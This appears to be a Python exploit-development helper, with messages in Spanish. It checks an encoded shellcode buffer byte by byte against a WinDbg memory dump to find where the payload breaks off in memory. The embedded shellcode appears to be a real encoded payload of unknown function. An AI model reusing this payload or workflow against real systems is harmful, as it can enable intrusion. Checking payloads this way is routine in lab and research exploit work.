import re

def load_shellcode(shellcode_code: str) -> bytes:
    namespace = {}
    exec(shellcode_code, {}, namespace)
    sc = namespace.get('shellcode')
    if not isinstance(sc, (bytes, bytearray)):
        raise ValueError("No se ha encontrado una variable 'shellcode' de tipo bytes")
    return bytes(sc)

def parse_windbg_dump(dump: str) -> bytes:
    byte_array = []
    for line in dump.splitlines():
        m = re.match(r'^[0-9A-Fa-f]{8}\s+([0-9A-Fa-f \-]+?)\s{2}', line)
        if not m:
            continue
        hex_region = m.group(1)
        pairs = re.findall(r'[0-9A-Fa-f]{2}', hex_region)
        byte_array.extend(int(h, 16) for h in pairs)
    return bytes(byte_array)

def compare_shellcode(shellcode: bytes, memory: bytes):
    print(f"[i] Shellcode: {len(shellcode)} bytes, Volcado: {len(memory)} bytes")
    min_len = min(len(shellcode), len(memory))
    for i in range(min_len):
        if shellcode[i] != memory[i]:
            print(f"[!] Desajuste en offset {i}: shellcode=0x{shellcode[i]:02x} vs memoria=0x{memory[i]:02x}")
            print(f"[!] El payload se interrumpe en la posición {i}")
            return
    if len(memory) < len(shellcode):
        faltan = len(shellcode) - len(memory)
        print(f"[!] El volcado de memoria es más corto que el shellcode.")
        print(f"[!] Faltan {faltan} bytes tras el offset {min_len}.")
    else:
        print("[+] Todos los bytes del shellcode están presentes en la memoria (o la memoria es más larga).")

if __name__ == "__main__":

    shellcode_code = r'''
shellcode = b"\xdb\xd5\xbe\xa1\xbe\xb1\x03\xd9\x74\x24\xf4"
shellcode += b"\x58\x31\xc9\xb1\x59\x31\x70\x19\x83\xc0\x04"
shellcode += b"\x03\x70\x15\x43\x4b\x4d\xeb\x0c\xb4\xae\xec"
shellcode += b"\x72\x84\x7c\x88\xf9\xb4\xb0\xd8\x18\xb3\xe3"
shellcode += b"\xd6\x69\x96\x17\x6c\x1f\x3f\x17\xc5\x95\x19"
shellcode += b"\x16\xd6\x18\xa6\xf4\x14\x3b\x5a\x07\x49\x9b"
shellcode += b"\x63\xc8\x9c\xda\xa4\x9e\xeb\x33\x78\x76\x9f"
shellcode += b"\x99\x6d\xf3\xdd\x21\x8f\xd3\x69\x19\xf7\x56"
shellcode += b"\xad\xed\x4b\x58\xfe\x86\x0c\x7a\xff\x4b\xfc"
shellcode += b"\xf1\xb7\x73\x78\xcc\x3c\xbf\xcb\xfe\x43\x34"
shellcode += b"\xff\x8b\xbd\x9c\x31\x4c\x7c\xef\x3f\xe0\x7e"
shellcode += b"\x28\x07\x18\xf5\x42\x7b\xa5\x0e\x91\x01\x71"
shellcode += b"\x9a\x05\xa1\xf2\x3c\xe1\x53\xd6\xdb\x62\x5f"
shellcode += b"\x93\xa8\x2c\x7c\x22\x7c\x47\x78\xaf\x83\x87"
shellcode += b"\x08\xeb\xa7\x03\x50\xaf\xc6\x12\x3c\x1e\xf6"
shellcode += b"\x44\x98\xff\x52\x0f\x0b\xe9\xe3\xf0\xd3\x16"
shellcode += b"\xbe\x66\x1f\xdb\x41\x76\x37\x6c\x31\x44\x98"
shellcode += b"\xc6\xdd\xe4\x51\xc1\x1a\x7d\x75\xf2\xf5\xc5"
shellcode += b"\x16\x0c\xf6\x35\x3e\xcb\xa2\x65\x28\xfa\xca"
shellcode += b"\xee\xa8\x03\x1f\x9a\xa2\x93\xc4\x07\x81\x57"
shellcode += b"\x6d\xb5\xe5\x86\x31\x30\x03\xf8\x99\x12\x9c"
shellcode += b"\xb9\x49\xd2\x4c\x52\x80\xdd\xb3\x42\xab\x34"
shellcode += b"\xdc\xe9\x44\xe0\xb4\x85\xfd\xa9\x4f\x37\x01"
shellcode += b"\x64\x2a\x77\x89\x8c\xca\x36\x7a\xe5\xd8\x2f"
shellcode += b"\x1d\x05\x21\xb0\x88\x05\x4b\xb4\x1a\x52\xe3"
shellcode += b"\xb6\x7b\x94\xac\x49\xae\xa7\xab\xb6\x2f\x91"
shellcode += b"\xc0\x81\xa5\x9d\xbe\xed\x29\x1d\x3f\xb8\x23"
shellcode += b"\x1d\x57\x1c\x10\x4e\x42\x63\x8d\xe3\xdf\xf6"
shellcode += b"\x2e\x55\xb3\x51\x47\x5b\xea\x96\xc8\xa4\xd9"
shellcode += b"\xa4\x0f\x5a\x9f\x82\xb7\x32\x5f\x93\x47\xc2"
shellcode += b"\x35\x13\x18\xaa\xc2\x3c\x97\x1a\x2a\x97\xf0"
shellcode += b"\x32\xa1\x76\xb2\xa3\xb6\x52\x12\x7d\xb6\x51"
shellcode += b"\x8f\x8e\xcd\x1a\x30\x6f\x32\x33\x55\x70\x32"
shellcode += b"\x3b\x6b\x4d\xe4\x02\x19\x90\x34\x31\x12\xa7"
shellcode += b"\x19\x10\xb9\xc7\x0e\x62\xe8"
'''

    windbg_dump = """
01987564  db d5 be a1 be b1 03 d9-74 24 f4 58 31 c9 b1 59  ........t$.X1..Y
01987574  31 70 19 83 c0 04 03 70-15 43 4b 4d eb 0c b4 ae  1p.....p.CKM....
01987584  ec 72 84 7c 88 f9 b4 b0-d8 18 b3 e3 d6 69 96 17  .r.|.........i..
01987594  6c 1f 3f 17 c5 95 19 16-d6 18 a6 f4 14 3b 5a 07  l.?..........;Z.
019875a4  49 9b 63 c8 9c da a4 9e-eb 33 78 76 9f 99 6d f3  I.c......3xv..m.
019875b4  dd 21 8f d3 69 19 f7 56-ad ed 4b 58 fe 86 0c 7a  .!..i..V..KX...z
019875c4  ff 4b fc f1 b7 73 78 cc-3c bf cb fe 43 34 ff 8b  .K...sx.<...C4..
019875d4  bd 9c 31 4c 7c ef 3f e0-7e 28 07 18 f5 42 7b a5  ..1L|.?.~(...B{.
019875e4  0e 91 01 71 9a 05 a1 f2-3c e1 53 d6 db 62 5f 93  ...q....<.S..b_.
019875f4  a8 2c 7c 22 7c 47 78 af-83 87 08 eb a7 03 50 af  .,|"|Gx.......P.
01987604  c6 12 3c 1e f6 44 98 ff-52 0f 0b e9 e3 f0 d3 16  ..<..D..R.......
01987614  be 66 1f db 41 76 37 6c-31 44 98 c6 dd e4 51 c1  .f..Av7l1D....Q.
01987624  1a 7d 75 f2 f5 c5 16 0c-f6 35 3e cb a2 65 28 fa  .}u......5>..e(.
01987634  ca ee a8 03 1f 9a a2 93-c4 07 81 57 6d b5 e5 86  ...........Wm...
01987644  31 30 03 f8 99 12 9c b9-49 d2 4c 52 80 dd b3 42  10......I.LR...B
01987654  ab 34 dc e9 44 e0 b4 85-fd a9 4f 37 01 64 2a 77  .4..D.....O7.d*w
01987664  89 8c ca 36 7a e5 d8 2f-1d 05 21 b0 88 05 4b b4  ...6z../..!...K.
01987674  1a 52 e3 b6 7b 94 ac 49-ae a7 ab b6 2f 91 c0 81  .R..{..I..../...
01987684  a5 9d be ed 29 1d 3f b8-23 1d 57 1c 10 4e 42 63  ....).?.#.W..NBc
01987694  8d e3 df f6 2e 55 b3 51-47 5b ea 96 c8 a4 d9 a4  .....U.QG[......
019876a4  0f 5a 9f 82 b7 32 5f 93-47 c2 35 13 18 aa c2 3c  .Z...2_.G.5....<
019876b4  97 1a 2a 97 f0 32 a1 76-b2 a3 b6 52 12 7d b6 51  ..*..2.v...R.}.Q
019876c4  8f 8e cd 1a 30 6f 32 33-55 70 32 3b 6b 4d e4 02  ....0o23Up2;kM..
019876d4  19 90 34 31 12 a7 19 10-b9 c7 0e 62 e8 43 43 43  ..41.......b.CCC
"""

    sc_bytes  = load_shellcode(shellcode_code)
    mem_bytes = parse_windbg_dump(windbg_dump)
    compare_shellcode(sc_bytes, mem_bytes)
